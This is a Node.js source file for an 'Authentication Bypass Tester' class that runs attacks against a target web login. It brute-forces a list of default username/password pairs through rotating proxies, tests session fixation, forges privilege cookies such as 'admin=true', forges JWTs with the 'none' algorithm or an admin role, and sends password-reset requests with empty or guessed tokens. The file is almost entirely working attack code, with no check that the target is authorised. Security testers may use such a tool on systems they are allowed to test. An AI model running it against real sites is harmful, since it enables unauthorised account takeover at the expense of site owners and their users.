const axios = require('axios');
const chalk = require('chalk');
const crypto = require('crypto');

class AuthBypass {
    constructor(config, proxies = []) {
        this.config = config;
        this.proxies = proxies;
        this.results = [];
        this.currentProxyIndex = 0;
    }

    getProxy() {
        if (!this.config.useProxy || this.proxies.length === 0) {
            return null;
        }
        const proxy = this.proxies[this.currentProxyIndex];
        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxies.length;
        return {
            host: proxy.host,
            port: proxy.port,
            protocol: proxy.protocol,
        };
    }

    getDefaultCredentials() {
        return [
            { username: 'admin', password: 'admin' },
            { username: 'admin', password: 'password' },
            { username: 'admin', password: '12345' },
            { username: 'admin', password: 'admin123' },
            { username: 'administrator', password: 'administrator' },
            { username: 'root', password: 'root' },
            { username: 'root', password: 'toor' },
            { username: 'admin', password: '' },
            { username: 'guest', password: 'guest' },
            { username: 'user', password: 'user' },
            { username: 'test', password: 'test' },
            { username: 'demo', password: 'demo' },
            { username: 'admin', password: 'admin@123' },
            { username: 'admin', password: 'Admin@123' },
            { username: 'sa', password: '' },
            { username: 'admin', password: '1234' },
            { username: 'admin', password: 'password123' },
            { username: 'administrator', password: 'password' },
            { username: 'admin', password: 'qwerty' },
            { username: 'admin', password: 'letmein' },
        ];
    }

    async testDefaultCredentials(targetUrl) {
        console.log(chalk.yellow('\n🔍 Testing Default Credentials...'));

        const credentials = this.getDefaultCredentials();
        const results = [];

        for (let i = 0; i < credentials.length; i++) {
            const cred = credentials[i];
            process.stdout.write(`\r${chalk.cyan(`Testing ${i + 1}/${credentials.length}: ${cred.username}:${cred.password || '(empty)'}`.padEnd(70))}`);

            const config = {
                method: 'POST',
                url: targetUrl,
                data: cred,
                timeout: 5000,
                validateStatus: () => true,
            };

            const proxy = this.getProxy();
            if (proxy) config.proxy = proxy;

            try {
                const response = await axios(config);

                const isSuccess = response.status === 200 ||
                    response.status === 302 ||
                    (response.data && !response.data.toString().toLowerCase().includes('invalid')) &&
                    !response.data.toString().toLowerCase().includes('incorrect');

                if (isSuccess) {
                    results.push({
                        method: 'default_credentials',
                        username: cred.username,
                        password: cred.password,
                        status: response.status,
                        vulnerability: {
                            type: 'DEFAULT_CREDENTIALS',
                            severity: 'CRITICAL',
                            description: `Default credentials accepted: ${cred.username}:${cred.password}`,
                        },
                    });
                    console.log(chalk.red(`\n✗ VULNERABLE: ${cred.username}:${cred.password || '(empty)'} - Status: ${response.status}`));
                }
            } catch (error) {
                continue;
            }

            if (this.config.delay) {
                await new Promise(resolve => setTimeout(resolve, this.config.delay));
            }
        }

        if (results.length === 0) {
            console.log(chalk.green('\n✓ No default credentials accepted'));
        }

        return results;
    }

    async testSessionFixation(targetUrl) {
        console.log(chalk.yellow('\n🔍 Testing Session Fixation...'));

        const results = [];
        const fixedSessionId = 'fixed-session-' + Math.random().toString(36).substring(7);

        const config = {
            method: 'GET',
            url: targetUrl,
            timeout: 5000,
            validateStatus: () => true,
            headers: {
                'Cookie': `PHPSESSID=${fixedSessionId}; sessionid=${fixedSessionId}`,
            },
        };

        const proxy = this.getProxy();
        if (proxy) config.proxy = proxy;

        try {
            const response = await axios(config);

            const setCookie = response.headers['set-cookie'];

            if (!setCookie || setCookie.some(cookie => cookie.includes(fixedSessionId))) {
                results.push({
                    method: 'session_fixation',
                    fixedSessionId,
                    vulnerability: {
                        type: 'SESSION_FIXATION',
                        severity: 'HIGH',
                        description: 'Server accepts pre-set session ID without regeneration',
                    },
                });
                console.log(chalk.red('✗ VULNERABLE: Session ID not regenerated'));
            } else {
                console.log(chalk.green('✓ Session ID regenerated correctly'));
            }
        } catch (error) {
            console.log(chalk.gray(`✗ Error testing: ${error.message}`));
        }

        return results;
    }

    async testCookieManipulation(targetUrl) {
        console.log(chalk.yellow('\n🔍 Testing Cookie Manipulation...'));

        const results = [];

        const manipulations = [
            { name: 'admin=true', cookie: 'admin=true' },
            { name: 'isAdmin=1', cookie: 'isAdmin=1' },
            { name: 'role=admin', cookie: 'role=admin' },
            { name: 'user_type=admin', cookie: 'user_type=admin' },
            { name: 'authenticated=true', cookie: 'authenticated=true' },
            { name: 'logged_in=1', cookie: 'logged_in=1' },
            { name: 'auth=1', cookie: 'auth=1' },
            { name: 'is_authenticated=true', cookie: 'is_authenticated=true' },
        ];

        for (let i = 0; i < manipulations.length; i++) {
            const manip = manipulations[i];
            process.stdout.write(`\r${chalk.cyan(`Testing ${i + 1}/${manipulations.length}: ${manip.name}`.padEnd(70))}`);

            const config = {
                method: 'GET',
                url: targetUrl,
                timeout: 5000,
                validateStatus: () => true,
                headers: {
                    'Cookie': manip.cookie,
                },
            };

            const proxy = this.getProxy();
            if (proxy) config.proxy = proxy;

            try {
                const response = await axios(config);

                if (response.status === 200 &&
                    !response.data.toString().toLowerCase().includes('login') &&
                    !response.data.toString().toLowerCase().includes('unauthorized')) {
                    results.push({
                        method: 'cookie_manipulation',
                        cookie: manip.cookie,
                        status: response.status,
                        vulnerability: {
                            type: 'COOKIE_MANIPULATION',
                            severity: 'HIGH',
                            description: `Authentication bypass via cookie: ${manip.cookie}`,
                        },
                    });
                    console.log(chalk.red(`\n✗ VULNERABLE: ${manip.name}`));
                }
            } catch (error) {
                continue;
            }

            if (this.config.delay) {
                await new Promise(resolve => setTimeout(resolve, this.config.delay));
            }
        }

        if (results.length === 0) {
            console.log(chalk.green('\n✓ No cookie manipulation vulnerabilities'));
        }

        return results;
    }

    async testJWTManipulation(targetUrl) {
        console.log(chalk.yellow('\n🔍 Testing JWT Token Manipulation...'));

        const results = [];

        if (!this.config.jwtToken) {
            console.log(chalk.gray('⚠️  No JWT token provided, skipping'));
            return results;
        }

        const base64UrlDecode = (str) => {
            str = str.replace(/-/g, '+').replace(/_/g, '/');
            const pad = str.length % 4;
            if (pad) str += '='.repeat(4 - pad);
            return Buffer.from(str, 'base64').toString('utf-8');
        };

        const base64UrlEncode = (str) => {
            return Buffer.from(str)
                .toString('base64')
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=/g, '');
        };

        try {
            const parts = this.config.jwtToken.split('.');
            if (parts.length !== 3) {
                console.log(chalk.red('✗ Invalid JWT token format'));
                return results;
            }

            const header = JSON.parse(base64UrlDecode(parts[0]));
            const payload = JSON.parse(base64UrlDecode(parts[1]));

            const manipulations = [
                {
                    name: 'None Algorithm',
                    modifyHeader: () => ({ ...header, alg: 'none' }),
                    modifyPayload: () => payload,
                    removeSignature: true,
                },
                {
                    name: 'Admin Role',
                    modifyHeader: () => header,
                    modifyPayload: () => ({ ...payload, role: 'admin', isAdmin: true }),
                    removeSignature: false,
                },
                {
                    name: 'User ID Manipulation',
                    modifyHeader: () => header,
                    modifyPayload: () => ({ ...payload, userId: 1, id: 1, sub: '1' }),
                    removeSignature: false,
                },
            ];

            for (const manip of manipulations) {
                const newHeader = base64UrlEncode(JSON.stringify(manip.modifyHeader()));
                const newPayload = base64UrlEncode(JSON.stringify(manip.modifyPayload()));
                const newToken = manip.removeSignature ?
                    `${newHeader}.${newPayload}.` :
                    `${newHeader}.${newPayload}.${parts[2]}`;

                const config = {
                    method: 'GET',
                    url: targetUrl,
                    timeout: 5000,
                    validateStatus: () => true,
                    headers: {
                        'Authorization': `Bearer ${newToken}`,
                    },
                };

                const proxy = this.getProxy();
                if (proxy) config.proxy = proxy;

                try {
                    const response = await axios(config);

                    if (response.status === 200) {
                        results.push({
                            method: 'jwt_manipulation',
                            manipulation: manip.name,
                            status: response.status,
                            vulnerability: {
                                type: 'JWT_MANIPULATION',
                                severity: 'CRITICAL',
                                description: `JWT bypass successful: ${manip.name}`,
                            },
                        });
                        console.log(chalk.red(`✗ VULNERABLE: ${manip.name}`));
                    }
                } catch (error) {
                    continue;
                }

                if (this.config.delay) {
                    await new Promise(resolve => setTimeout(resolve, this.config.delay));
                }
            }

            if (results.length === 0) {
                console.log(chalk.green('✓ JWT manipulation attempts failed'));
            }

        } catch (error) {
            console.log(chalk.red(`✗ Error: ${error.message}`));
        }

        return results;
    }

    async testPasswordReset(resetUrl) {
        console.log(chalk.yellow('\n🔍 Testing Password Reset Vulnerabilities...'));

        const results = [];

        if (!resetUrl) {
            console.log(chalk.gray('⚠️  No password reset URL provided, skipping'));
            return results;
        }

        const tests = [
            {
                name: 'Token Reusability',
                token: 'test-token-' + Math.random().toString(36).substring(7),
            },
            {
                name: 'Predictable Token',
                token: 'reset123',
            },
            {
                name: 'Empty Token',
                token: '',
            },
        ];

        for (const test of tests) {
            const config = {
                method: 'POST',
                url: resetUrl,
                data: {
                    token: test.token,
                    password: 'NewPassword123!',
                },
                timeout: 5000,
                validateStatus: () => true,
            };

            const proxy = this.getProxy();
            if (proxy) config.proxy = proxy;

            try {
                const response = await axios(config);

                if (response.status === 200 &&
                    !response.data.toString().toLowerCase().includes('invalid') &&
                    !response.data.toString().toLowerCase().includes('expired')) {
                    results.push({
                        method: 'password_reset',
                        test: test.name,
                        vulnerability: {
                            type: 'PASSWORD_RESET_BYPASS',
                            severity: 'CRITICAL',
                            description: `Password reset vulnerability: ${test.name}`,
                        },
                    });
                    console.log(chalk.red(`✗ VULNERABLE: ${test.name}`));
                }
            } catch (error) {
                continue;
            }

            if (this.config.delay) {
                await new Promise(resolve => setTimeout(resolve, this.config.delay));
            }
        }

        if (results.length === 0) {
            console.log(chalk.green('✓ No password reset vulnerabilities'));
        }

        return results;
    }

    async run() {
        console.log(chalk.bold.cyan('\n🔐 Authentication Bypass Tester Started\n'));
        console.log(chalk.gray('='.repeat(60)));
        console.log(chalk.white(`Target: ${this.config.targetUrl}`));
        console.log(chalk.white(`Tests: ${this.config.tests.join(', ')}`));
        console.log(chalk.gray('='.repeat(60)));

        const startTime = Date.now();
        const allResults = {
            timestamp: new Date().toISOString(),
            targetUrl: this.config.targetUrl,
            tests: {},
        };

        if (this.config.tests.includes('default_credentials') || this.config.tests.includes('all')) {
            allResults.tests.defaultCredentials = await this.testDefaultCredentials(this.config.targetUrl);
        }

        if (this.config.tests.includes('session_fixation') || this.config.tests.includes('all')) {
            allResults.tests.sessionFixation = await this.testSessionFixation(this.config.targetUrl);
        }

        if (this.config.tests.includes('cookie_manipulation') || this.config.tests.includes('all')) {
            allResults.tests.cookieManipulation = await this.testCookieManipulation(this.config.targetUrl);
        }

        if (this.config.tests.includes('jwt_manipulation') || this.config.tests.includes('all')) {
            allResults.tests.jwtManipulation = await this.testJWTManipulation(this.config.targetUrl);
        }

        if (this.config.tests.includes('password_reset') || this.config.tests.includes('all')) {
            allResults.tests.passwordReset = await this.testPasswordReset(this.config.passwordResetUrl);
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);

        let totalVulnerabilities = 0;
        Object.values(allResults.tests).forEach(testResults => {
            if (Array.isArray(testResults)) {
                totalVulnerabilities += testResults.length;
            }
        });

        console.log(chalk.bold.cyan('\n\n📊 Authentication Bypass Summary\n'));
        console.log(chalk.gray('='.repeat(60)));

        if (totalVulnerabilities > 0) {
            console.log(chalk.red(`\n⚠️  Total Vulnerabilities: ${totalVulnerabilities}`));

            Object.entries(allResults.tests).forEach(([testName, results]) => {
                if (Array.isArray(results) && results.length > 0) {
                    console.log(chalk.yellow(`\n${testName}:`));
                    results.forEach(result => {
                        if (result.vulnerability) {
                            console.log(chalk.white(`  • ${result.vulnerability.type} (${result.vulnerability.severity})`));
                            console.log(chalk.gray(`    ${result.vulnerability.description}`));
                        }
                    });
                }
            });
        } else {
            console.log(chalk.green('\n✓ No authentication bypass vulnerabilities detected'));
        }

        console.log(chalk.gray(`\nTime elapsed: ${elapsed}s`));
        console.log(chalk.gray('='.repeat(60)));

        allResults.summary = {
            totalVulnerabilities,
            timeElapsed: elapsed,
        };

        this.results.push(allResults);

        console.log(chalk.bold.green('\n✅ Authentication Bypass Testing Complete!\n'));

        return allResults;
    }

    exportJSON(filename) {
        const fs = require('fs');
        fs.writeFileSync(filename, JSON.stringify(this.results, null, 2));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }

    exportCSV(filename) {
        const fs = require('fs');
        const csvRows = ['Timestamp,Test Type,Method,Vulnerability Type,Severity,Description'];

        this.results.forEach(result => {
            Object.entries(result.tests).forEach(([testName, testResults]) => {
                if (Array.isArray(testResults)) {
                    testResults.forEach(item => {
                        if (item.vulnerability) {
                            csvRows.push(
                                `${result.timestamp},"${testName}","${item.method}","${item.vulnerability.type}","${item.vulnerability.severity}","${item.vulnerability.description}"`
                            );
                        }
                    });
                }
            });
        });

        fs.writeFileSync(filename, csvRows.join('\n'));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }
}

module.exports = AuthBypass;